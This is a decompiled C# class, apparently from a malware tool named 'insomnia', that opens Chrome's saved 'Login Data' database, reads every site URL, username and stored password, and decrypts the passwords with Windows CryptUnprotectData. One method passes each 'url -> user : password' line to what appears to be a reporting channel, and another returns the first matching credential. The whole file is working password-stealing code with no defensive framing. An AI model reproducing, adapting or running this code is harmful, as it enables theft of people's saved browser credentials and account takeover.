using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace insomnia;

internal class Class37
{
	[Flags]
	private enum Enum7
	{
		Field2 = 1,
		Field1 = 2
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct Struct8
	{
		public int Field4;

		public Enum7 Field3;

		public IntPtr Field2;

		public string Field1;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct Struct9
	{
		public int Field2;

		public IntPtr Field1;
	}

	public static void Method4(string A_0)
	{
		if (A_0 == "" || A_0 == " " || A_0 == null)
		{
			A_0 = "**ALL**";
		}
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
		try
		{
			Class6 @class = new Class6(text);
			@class.Method5("logins");
			if (!File.Exists(text))
			{
				return;
			}
			for (int i = 0; i <= @class.Method4() - 1; i++)
			{
				try
				{
					string text2 = @class.Method2(i, "origin_url");
					string text3 = @class.Method2(i, "username_value");
					string text4 = Method1(Encoding.Default.GetBytes(@class.Method2(i, "password_value")));
					if (text3 != "" && text4 != "" && text4 != "FAIL" && (text2.Contains(A_0) || A_0 == "**ALL**"))
					{
						Class31.Method3("[CHROME]: " + text2 + " -> " + text3 + " : " + text4, Class26.Field8);
					}
					Thread.Sleep(100);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	public static string Method3(string A_0)
	{
		if (A_0 == "" || A_0 == " " || A_0 == null)
		{
			A_0 = "**ALL**";
		}
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
		try
		{
			Class6 @class = new Class6(text);
			@class.Method5("logins");
			if (File.Exists(text))
			{
				for (int i = 0; i <= @class.Method4() - 1; i++)
				{
					try
					{
						string text2 = @class.Method2(i, "origin_url");
						string text3 = @class.Method2(i, "username_value");
						string text4 = Method1(Encoding.Default.GetBytes(@class.Method2(i, "password_value")));
						if (text3 != "" && text4 != "" && text4 != "FAIL" && (text2.Contains(A_0) || A_0 == "**ALL**"))
						{
							return text3 + ":" + text4;
						}
					}
					catch
					{
						return "";
					}
				}
			}
		}
		catch
		{
			return "";
		}
		return "";
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref Struct9 A_0, string A_1, ref Struct9 A_2, IntPtr A_3, ref Struct8 A_4, int A_5, ref Struct9 A_6);

	private static string Method1(byte[] A_0)
	{
		Struct9 A_ = default(Struct9);
		Struct9 A_2 = default(Struct9);
		GCHandle gCHandle = GCHandle.Alloc(A_0, GCHandleType.Pinned);
		A_.Field1 = gCHandle.AddrOfPinnedObject();
		A_.Field2 = A_0.Length;
		gCHandle.Free();
		Struct9 A_3 = default(Struct9);
		Struct8 A_4 = default(Struct8);
		CryptUnprotectData(ref A_, null, ref A_3, IntPtr.Zero, ref A_4, 0, ref A_2);
		byte[] array = new byte[A_2.Field2 + 1];
		Marshal.Copy(A_2.Field1, array, 0, A_2.Field2);
		string @string = Encoding.Default.GetString(array);
		return @string.Substring(0, @string.Length - 1);
	}
}
